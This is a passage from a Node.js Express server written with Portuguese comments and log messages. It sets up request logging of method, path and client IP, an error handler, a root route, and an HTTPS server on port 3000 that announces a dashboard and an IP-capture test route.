app.use((req, res, next) => {
  console.log('📝 ' + new Date().toLocaleString() + ' - ' + req.method + ' ' + req.path + ' - IP: ' + req.ip);
  next();
});
// ========== TRATAMENTO DE ERROS ==========
app.use((err, req, res, next) => {
  console.error('💥 Erro no servidor:', err.message);
  res.status(500).json({ error: 'Erro interno do servidor' });
});
// ========== ROTA RAIZ ==========
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});
// ========== CONFIGURAÇÃO HTTPS ==========
const options = {
  key: fs.readFileSync('key.pem'),
  cert: fs.readFileSync('cert.pem')
};
// ========== INICIALIZAÇÃO DO SERVIDOR ==========
https.createServer(options, app).listen(3000, () => {
  console.log('🔒 Servidor HTTPS rodando na porta 3000');
  console.log('🌐 Acesse: https://localhost:3000');
  console.log('📊 Dashboard: https://localhost:3000/dashboard');
  console.log('🔍 Teste de IP: https://localhost:3000/meu-ip');
  console.log('✅ Sistema de captura de IP público ativo!');
});